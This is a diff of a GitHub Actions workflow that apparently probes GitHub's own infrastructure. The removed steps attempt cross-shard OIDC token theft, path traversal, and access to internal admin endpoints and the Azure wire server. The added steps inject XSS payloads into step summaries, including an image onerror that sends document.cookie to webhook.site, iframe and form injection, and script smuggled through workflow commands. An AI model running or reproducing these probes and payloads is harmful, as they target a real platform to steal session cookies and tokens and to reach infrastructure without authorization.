@@ -8,93 +8,65 @@ jobs:
   inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: OIDC BOLA - cross-shard and cross-job token access
-        continue-on-error: true
+      - name: Step Summary HTML Injection test
         run: |
-          echo "=== OWN URL ==="
-          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
-          BASE=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+')
-          SHARD=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '/\d+//')
-          PLAN=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '[0-9a-f-]{36}' | head -1)
-          JOB=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '[0-9a-f-]{36}' | tail -1)
-          echo "Base: $BASE, Shard: $SHARD, Plan: $PLAN, Job: $JOB"
-          echo ""
+          # Test various injection payloads in step summary
+          cat >> $GITHUB_STEP_SUMMARY << 'SUMMARY'
+          # Step Summary Injection Test
 
-          echo "=== TEST 1: Different shard (cross-shard BOLA) ==="
-          for shard in 0 1 5 10 22 50; do
-            URL="${BASE}/${shard}//idtoken/${PLAN}/${JOB}?api-version=2.0"
-            HTTP=$(curl -s --max-time 5 \
-              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-              "$URL&audience=sigstore" -o /tmp/bola.json -w "%{http_code}")
-            echo "  Shard $shard -> HTTP $HTTP $(cat /tmp/bola.json 2>/dev/null | head -c 60)"
-          done
+          ## Markdown test
+          **Normal bold**
 
+          ## Raw HTML test
+          <h1 id="html-h1">Raw H1 via HTML</h1>
+          <script>document.title='XSS-FIRED'</script>
+          <img src=x onerror="fetch('https://webhook.site/xss?cookie='+document.cookie)">
+          <svg onload="alert('SVG-XSS')"><rect width="100" height="100"/></svg>
+          <details open ontoggle="alert('ontoggle-xss')"><summary>click</summary></details>
+
+          ## CSS injection test
+          <style>body{background:red}</style>
+          <link rel="stylesheet" href="https://webhook.site/css-load?src=github">
+
+          ## Content injection
+          <iframe src="https://webhook.site/iframe"></iframe>
+          <form action="https://webhook.site/form"><input name="cookie" value="test"/><button>Submit</button></form>
+
+          ## Unicode zero-width / homograph test
+          Normal looking link: [Click](https://github.com&#x2F;&#x2E;&#x2E;/settings)
+
+          SUMMARY
+          echo "Step summary written"
+
+      - name: Run name injection test
+        run: |
+          # Can we change the run name via workflow command?
+          echo "::notice title=INJECTED-NOTICE::<script>alert(1)</script>"
+          echo "::error title=ERROR-INJECTION::<img src=x onerror=alert(2)>"
+          echo "::warning::<script>alert('warning-xss')</script>"
+
+      - name: merge_group OIDC claims test
+        run: |
+          echo "=== CURRENT TRIGGER ==="
+          echo "Event: $GITHUB_EVENT_NAME"
+          echo "Ref: $GITHUB_REF"
+          echo "Head Ref: $GITHUB_HEAD_REF"
+          echo "Base Ref: $GITHUB_BASE_REF"
           echo ""
-          echo "=== TEST 2: Same shard, different UUIDs (non-existent job) ==="
-          FAKE_UUID="00000000-0000-0000-0000-000000000000"
-          URL="${BASE}${SHARD}idtoken/${FAKE_UUID}/${FAKE_UUID}?api-version=2.0"
-          HTTP=$(curl -s --max-time 5 \
+          echo "=== OIDC CLAIMS FOR THIS TRIGGER ==="
+          T=$(curl -sf \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$URL&audience=sigstore" -o /tmp/bola2.json -w "%{http_code}")
-          echo "  Fake UUIDs -> HTTP $HTTP $(cat /tmp/bola2.json | head -c 80)"
-
-          echo ""
-          echo "=== TEST 3: Double-slash path traversal ==="
-          # Try ../1//idtoken to cross shards via traversal
-          for s in 0 1 22; do
-            URL="${BASE}${SHARD}../../../${s}//idtoken/${PLAN}/${JOB}?api-version=2.0"
-            HTTP=$(curl -s --max-time 5 \
-              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-              "$URL&audience=sigstore" -o /dev/null -w "%{http_code}")
-            echo "  Traversal to shard $s -> HTTP $HTTP"
-          done
-
-      - name: Artifact Results API direct probe
-        continue-on-error: true
-        run: |
-          echo "=== RESULTS API STRUCTURE ==="
-          for host in results.actions.githubusercontent.com \
-              artifactcache.actions.githubusercontent.com \
-              uploads.github.com; do
-            for path in / /health /_ping /metrics /twirp \
-                /twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts \
-                /twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact; do
-              HTTP=$(curl -s --max-time 4 \
-                "https://$host$path" -o /dev/null -w "%{http_code}" 2>/dev/null)
-              [ "$HTTP" != "000" ] && echo "  https://$host$path -> $HTTP"
-            done
-          done
-
-      - name: GitHub token scope probing - can GITHUB_TOKEN access private APIs?
-        continue-on-error: true
-        run: |
-          echo "=== GITHUB_TOKEN PRIVATE API ACCESS ==="
-          # Test if GITHUB_TOKEN can access normally-restricted endpoints
-          for ep in \
-            "https://api.github.com/enterprises" \
-            "https://api.github.com/admin/users" \
-            "https://api.github.com/stafftools/users/dannyggg3" \
-            "https://api.github.com/site_admin/users" \
-            "https://github.com/_private/browser/stats" \
-            "https://api.github.com/internal/github-apps"; do
-            HTTP=$(curl -s --max-time 5 \
-              -H "Authorization: bearer $GITHUB_TOKEN" \
-              "$ep" -o /dev/null -w "%{http_code}" 2>/dev/null)
-            echo "  $ep -> HTTP $HTTP"
-          done
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Wire server - minimal test with 2s timeout
-        continue-on-error: true  
-        run: |
-          echo "=== WIRE SERVER MINIMAL ==="
-          for path in "/machine?comp=goalstate" "/machine?comp=health"; do
-            HTTP=$(curl -s --max-time 2 \
-              "http://168.63.129.16$path" \
-              -o /tmp/wire.txt -w "%{http_code}" 2>/dev/null || echo "TIMEOUT")
-            echo "  $path -> $HTTP ($(wc -c < /tmp/wire.txt 2>/dev/null) bytes)"
-          done
-          echo "=== DNS via wire server ==="
-          curl -s --max-time 2 "http://168.63.129.16/" -o /tmp/wire_root.txt -w "Root: %{http_code}\n"
-          head -5 /tmp/wire_root.txt 2>/dev/null
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value // "FAILED"')
+          if [ "$T" != "FAILED" ]; then
+            echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+print('ref:', d.get('ref'))
+print('head_ref:', d.get('head_ref'))
+print('base_ref:', d.get('base_ref'))
+print('event_name:', d.get('event_name'))
+print('sub:', d.get('sub'))
+print('ref_protected:', d.get('ref_protected'))
+print('workflow_ref:', d.get('workflow_ref'))
+"
+          fi
